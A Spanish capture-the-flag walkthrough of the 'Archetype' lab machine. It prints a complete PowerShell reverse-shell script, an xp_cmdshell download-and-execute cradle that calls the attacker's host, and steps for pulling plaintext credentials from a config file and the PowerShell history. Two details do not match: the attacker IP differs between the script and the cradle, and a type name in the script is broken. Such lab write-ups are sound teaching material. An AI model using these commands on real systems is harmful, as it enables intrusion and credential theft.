# ARCHETYPE

## Reconocimiento

### Nmap
Lo primero que haremos será enumerar los puertos abiertos en la máquina víctima, para ello usaremos [nmap](https://github.com/nmap/nmap), al que le indicaremos que queremos filtrar el rango de puertos completo, que solo nos muestre los puertos que estén abiertos y que usaremos el método de enumeración TCP Syn Port Scan. Opcionalmente se pueden desactivar el descubrimiento de hosts y la resolución DNS para agilizar el escaneo. Por último, exportaremos las evidencias al fichero allPorts:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.27 -oG allPorts
```

```bash
File: allPorts

# Nmap 7.91 scan initiated Mon Jun 7 23:54:54 2021 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.10.27
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.27 () Status: Up
Host: 10.10.10.27 () Ports: 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 445/open/tcp//microsoft-ds///, 1433/open/tcp//ms-sql-s///, 5985/open/tcp//wsman///, 47001/open/tcp//winrm///, 49664/open/tcp/////, 49665/open/tcp/////, 49666/open/tcp/////, 49667/open/tcp/////, 49668/open/tcp/////, 49669/open/tcp/////
# Nmap done at Mon Jun 7 23:55:05 2021 -- 1 IP address (1 host up) scanned in 11.08 seconds
```

<br>

Efectuaremos un escaneo más exhaustivo para ver los servicios y versiones que corren bajo estos puertos abiertos, exportaremos las evidencias al fichero targeted:

```bash
nmap -sC -sV -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669 -oN targeted 10.10.10.27
```

```bash
File: targeted

# Nmap 7.91 scan initiated Mon Jun 7 23:56:24 2021 as: nmap -sC -sV -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669 -oN targeted 10.10.10.27
Nmap scan report for 10.10.10.27
Host is up (0.040s latency).

PORT STATE SERVICE VERSION
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
445/tcp open microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info:
| Target_Name: ARCHETYPE
| NetBIOS_Domain_Name: ARCHETYPE
| NetBIOS_Computer_Name: ARCHETYPE
| DNS_Domain_Name: Archetype
| DNS_Computer_Name: Archetype
|_ Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-06-07T21:58:33
|_Not valid after: 2051-06-07T21:58:33
|_ssl-date: 2021-06-07T22:15:47+00:00; +18m18s from scanner time.
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open msrpc Microsoft Windows RPC
49665/tcp open msrpc Microsoft Windows RPC
49666/tcp open msrpc Microsoft Windows RPC
49667/tcp open msrpc Microsoft Windows RPC
49668/tcp open msrpc Microsoft Windows RPC
49669/tcp open msrpc Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h42m18s, deviation: 3h07m51s, median: 18m17s
| ms-sql-info:
| 10.10.10.27:1433:
| Version:
| name: Microsoft SQL Server 2017 RTM
| number: 14.00.1000.00
| Product: Microsoft SQL Server 2017
| Service pack level: RTM
| Post-SP patches applied: false
|_ TCP port: 1433
| smb-os-discovery:
| OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
| Computer name: Archetype
| NetBIOS computer name: ARCHETYPE\x00
| Workgroup: WORKGROUP\x00
|_ System time: 2021-06-07T15:15:42-07:00
| smb-security-mode:
| account_used: guest
| authentication_level: user
| challenge_response: supported
|_ message_signing: disabled (dangerous, but default)
| smb2-security-mode:
| 2.02:
|_ Message signing enabled but not required
| smb2-time:
| date: 2021-06-07T22:15:40
|_ start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 7 23:57:29 2021 -- 1 IP address (1 host up) scanned in 64.83 seconds
```

Veremos dos puertos abiertos que son interesantes, el 445 y el 1433, el primero de ellos corresponde a SMB (Samba) y el segundo a Microsoft SQL Server.

<br>

### SMB
Lo primero que haremos será comprobar si podemos acceder a Samba con una null session, para ello usaremos la utilidad smbclient de [Impacket](https://github.com/SecureAuthCorp/impacket):

```bash
smbclient -N \\\\10.10.10.27\\
```

<br>

Accederemos y encontraremos una carpeta llamada backups que contiene el archivo prod.dtsConfig:

```plaintext
File: prod.dtsConfig

<DTSConfiguration&gt;
<DTSConfigurationHeading&gt;
<DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/&gt;
DTSConfigurationHeading&gt;
<Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String"&gt;
<ConfiguredValue&gt;Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue&gt;
Configuration&gt;
DTSConfiguration&gt;
```

Veremos las siguientes credenciales:

```plaintext
File: sqlCreds

ARCHETYPE\sql_svc:M3g4c0rp123
```

<br>

## Shell del usuario

### Microsoft SQL Server
Probaremos a conectarnos a Microsoft SQL Server con las credenciales que acabamos de encontrar, para ello usaremos la herramienta mssqlclient de [Impacket](https://github.com/SecureAuthCorp/impacket) con el comando:

```bash
impacket-mssqlclient ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
```

<br>

Una vez dentro, habilitaremos la ejecución de comandos del sistema en la sesión interactiva del servidor SQL, para ello:

```powershell
SQL&gt; enable_xp_cmdshell
[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
```

Comprobaremos que la ejecución de comandos del sistem funciona, para ello:

```powershell
SQL&gt; xp_cmdshell "whoami"
output
--------------------------------------------------------------------------------
archetype\sql_svc
NULL
```

<br>

Lo siguiente que haremos será ejecutar una reverse Powershell desde la sesión interactiva de SQL. Usaremos el siguiente script:

```powershell
File: g2shell.ps1

$client = New-Object System.Net.Sockets.TCPClient("10.10.15.26",9999);
$stream =$client.GetStream();
[byte[]]$bytes = 0..65535|%{0};

while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){
	;$data = (New-Object -Type NameSystem.Text.ASCIIEncoding).GetString($bytes,0, $i);
	$sendback = (iex $data 2&gt;&1 |Out-String ); $sendback2 = $sendback + "# ";
	$sendbyte =([text.encoding]::ASCII).GetBytes($sendback2);
	$stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()
}; 

$client.Close()
```

A continuación, nos montaremos un servidor HTTP por el puerto 80 para alojar el archivo g2shell.ps1, yo usaré [Python3](https://www.python.org/downloads/) para esto:

```bash
python -m http.server 80
```

A la vez ejecutaremos [Netcat](http://netcat.sourceforge.net/ para escuchar en el puerto 9999, para ello:

```bash
nc -lvnp 9999
```

Por último, desde la sesión SQL ejecutaremos el siguiente comando para hacer una petición al servidor HTTP y así transferir y ejecutar el archivo g2shell.ps1 en la máquina víctima:

```powershell
xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.15.95/g2shell.ps1\");"
```

Recibiremos la shell y conseguiremos la flag user.txt en el directorio C:\Users\sql_svc\Desktop\

<br>

## Shell de administrador

### Enumeración
Comenzaremos enumerando la máquina para ver cómo podemos escalar privilegios. Podemos empezar enumerando archivos que se abran frecuentemente o comandos que se hayan ejecutado recientemente. Comprobaremos el histórico de Powershell:

```powershell
xp_cmdshell "type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

Este archivo nos devolverá lo siguiente:

```powershell
output
--------------------------------------------------------------------------------
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!

NULL
```

<br>

Como vemos se está usando el usuario administrador para montar la ruta backup (la que hemos visto en SMB) en la unidad de disco T:, además veremos la contraseña que se está usando por lo que podremos usarla para acceder a la máquina como usuario administrador:

```plaintext
File: adminCreds

administrator:MEGACORP_4dm1n!!
```

<br>

### PSExec
Para acceder a la máquina como usuario administrador usaremos la herramienta PSExec de [Impacket](https://github.com/SecureAuthCorp/impacket) la cual nos permitirá ejecutar una Powershell en una máquina remota una vez conocidas las creedenciales del usuario administrador:

```bash
impacket-psexec administrator@10.10.10.27
```

Por último, nos dirigiremos al directorio C:\Users\Administrator\Desktop donde visualizaremos la flag root.txt.